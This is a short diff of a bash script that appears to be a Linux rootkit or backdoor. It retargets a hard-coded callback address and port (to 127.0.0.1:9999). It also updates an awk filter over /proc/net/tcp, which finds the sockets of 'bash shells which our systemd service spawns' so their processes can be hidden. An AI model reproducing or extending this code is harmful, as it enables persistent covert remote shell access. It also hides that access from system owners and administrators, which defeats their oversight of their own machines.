@@ -26,7 +26,7 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 '
 
-ip="192.168.80.1"
+ip="127.0.0.1"
 port="9999"
 
 #---functions and variables---
@@ -537,7 +537,7 @@ while read hide_pid; do
 done <<<$bash_pid
 
 #hide bash shells which our systemd service spawns
-inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0150A8C0:270F/) print $10 }')
+inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0100007F:270F/) print $10 }')
 for (( i=1; i <= 65553; i=i+1 )); do
   if [ "${hidden_pids[i]}" != "" ]; then
     #echo "$i already on hidden_pids"
